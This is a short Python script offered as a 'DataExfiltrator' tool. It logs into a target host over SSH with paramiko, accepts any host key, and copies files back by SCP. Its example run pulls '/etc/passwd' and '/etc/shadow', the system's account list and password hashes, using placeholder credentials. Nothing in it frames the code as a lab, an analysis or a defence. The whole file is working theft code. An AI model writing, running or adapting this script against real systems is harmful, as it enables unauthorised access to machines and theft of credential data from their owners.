import subprocess
import logging
from scp import SCPClient
import paramiko

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class DataExfiltrator:
    def __init__(self, ssh_client):
        self.ssh_client = ssh_client

    def exfiltrate(self, target_ip, data_paths, destination):
        """Securely transfers data from the target to the specified destination."""
        with SCPClient(self.ssh_client.get_transport()) as scp:
            for data_path in data_paths:
                try:
                    scp.get(data_path, local_path=destination)
                    logging.info(f"Successfully exfiltrated {data_path} to {destination}")
                except Exception as e:
                    logging.error(f"Failed to exfiltrate {data_path}: {e}")

# Example usage
if __name__ == "__main__":
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname='target_ip', username='user', password='pass')
        exfiltrator = DataExfiltrator(ssh)
        paths_to_exfiltrate = ['/etc/passwd', '/etc/shadow']
        exfiltrator.exfiltrate('target_ip', paths_to_exfiltrate, '/local/destination')
    except Exception as e:
        logging.error(f"Data exfiltration failed: {e}")
    finally:
        ssh.close()
